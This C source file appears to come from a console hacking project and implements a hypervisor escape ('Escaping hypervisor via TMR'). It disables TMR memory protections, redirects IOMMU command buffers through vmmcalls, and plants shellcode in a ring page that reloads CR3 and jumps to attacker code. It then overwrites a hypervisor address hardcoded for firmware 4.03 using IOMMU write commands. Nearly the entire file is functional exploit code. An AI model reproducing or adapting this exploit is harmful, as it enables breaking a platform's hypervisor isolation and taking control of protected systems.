#include <stddef.h>
#include "hv_escape.h"
#include "vmmcall.h"
#include "uart.h"

extern uint64_t our_cr3;
extern void escaped_hv(void);

static inline uint32_t tmr_read(uint32_t addr)
{
    *(volatile uint32_t*)0xf00c2080 = addr;
    return *(volatile uint32_t*)0xf00c2084;
}

static inline void tmr_write(uint32_t addr, uint32_t data)
{
    *(volatile uint32_t*)0xf00c2080 = addr;
    *(volatile uint32_t*)0xf00c2084 = data;
}

static inline void tmr_disable(void)
{
    for(int i = 0; i < 24; i++)
    {
        uint32_t cur = tmr_read(16*i+8);
        putstring("TMR #");
        puthex(i + i / 10 * 6);
        putstring(": 0x");
        puthex(cur);
        if(cur)
        {
            putstring(" -> 0");
            tmr_write(16*i+8, 0);
            if(tmr_read(16*i+8))
                putstring(" (FAILED)");
        }
        putstring("\r\n");
    }
}

static inline void iommu_write(uint64_t addr, uint64_t value)
{
    putstring("Writing 0x");
    puthex(value);
    putstring(" to 0x");
    puthex(addr);
    putstring("... ");
    uint64_t iommu_mmio = *(uint64_t*)0xf0002044 & -2;
    uint64_t head = *(volatile uint64_t*)(iommu_mmio + 0xe000);
    uint64_t tail = *(volatile uint64_t*)(iommu_mmio + 0xe008);
    uint64_t command[2] = {addr | 0x1000000000000005, value};
    uint8_t* p = (uint8_t*)command;
    uint8_t* q = p + 16;
    while(p < q)
    {
        *(uint8_t*)(our_cr3 + 0x2000 + tail) = *p++;
        tail = (tail + 1) & 0x1fff;
    }
    *(volatile uint64_t*)(iommu_mmio + 0xe008) = tail;
    while(*(volatile uint64_t*)(iommu_mmio + 0xe000) != tail);
    putstring("done\r\n");
}

static inline uint64_t get_overwrite_address(void)
{
    //FIXME: 4.03 offset
    return 0x62822780;
}

static inline void write_ring_page(uint8_t* ring_page, size_t* address, uint64_t value, size_t sz)
{
    for(size_t i = 0; i < sz; i++)
    {
        ring_page[(*address)++%4096] = value;
        value >>= 8;
    }
}

static inline uint64_t rdtsc(void)
{
    uint32_t eax, edx;
    asm volatile("rdtsc":"=a"(eax),"=d"(edx));
    return ((uint64_t)edx << 32) | eax;
}

static inline void delay(uint64_t howmuch)
{
    uint64_t start = rdtsc();
    while(rdtsc() - start < howmuch);
}

/*
    We're given 16 pages at our_cr3. 2 are used for the idmap pagetable, 14 are unused
    How they are used for this exploit:

    cr3+0x0000             PML4 of idmap pagetable
    cr3+0x1000             PML3 of idmap pagetable
    cr3+0x2000, cr3+0x3000 IOMMU command buffers (both in the same range, we only use one)
    cr3+0x4000             IOMMU event log
    cr3+0x5000..cr3+0x8000 Ring-page pagetables
    cr3+0x9000             Ring page
    cr3+0xa000             Ring page (second page)
*/
void hv_escape_tmr(uint32_t fw)
{
    putstring("Escaping hypervisor via TMR\r\n");
    putstring("Command buffers set\r\n");
    //reconfigure tmrs
    tmr_disable();
    putstring("TMRs disabled\r\n");
    //set command buffer pointer
    vmmcall_iommu_set_guest_buffers(our_cr3 + 0x2000, our_cr3 + 0x2000, our_cr3 + 0x4000);
    while(vmmcall_iommu_check_cmd_completion());
    //initialize the ring page
    uint64_t overwrite = get_overwrite_address();
    uint8_t* ring_page = (void*)(our_cr3+0x9000);
    size_t ptr = overwrite + 13;
    write_ring_page(ring_page, &ptr, 0x25ff, 6);
    write_ring_page(ring_page, &ptr, ((our_cr3+0x9000)|((ptr+8+2+8+3)%4096))-(2+8+3), 8);
    write_ring_page(ring_page, &ptr, 0xb848, 2);
    write_ring_page(ring_page, &ptr, our_cr3, 8);
    write_ring_page(ring_page, &ptr, 0xd8220f, 3);
    write_ring_page(ring_page, &ptr, 0x25ff, 6);
    write_ring_page(ring_page, &ptr, (uintptr_t)escaped_hv, 8);
    for(size_t i = 0; i < 4096; i++)
        ring_page[i+4096] = ring_page[i];
    //initialize ring-page pagetables (same page mapped to the whole address space)
    uint64_t(*rp_pgt)[512] = (void*)(our_cr3 + 0x5000);
    for(size_t i = 0; i < 4; i++)
    {
        uint64_t v = (uint64_t)&rp_pgt[i+1] | 1;
        for(size_t j = 0; j < 512; j++)
            rp_pgt[i][j] = v;
    }
    //overwriting
    iommu_write(overwrite, ((uint64_t)rp_pgt << 16) | 0xb848);
    iommu_write(overwrite+8, ((uint64_t)rp_pgt >> 48) | 0xd8220f0000);
    //test iommu write to verify that it works
    static uint64_t q = 0;
    putstring("selftest: ");
    iommu_write((uint64_t)&q, 0x123);
    if(q != 0x123)
    {
        putstring("Fatal: IOMMU write is not working\r\n");
        for(;;)
            asm volatile("");
    }
    //all done
    delay(500000000);
    putstring("HV escape armed\r\n");
}
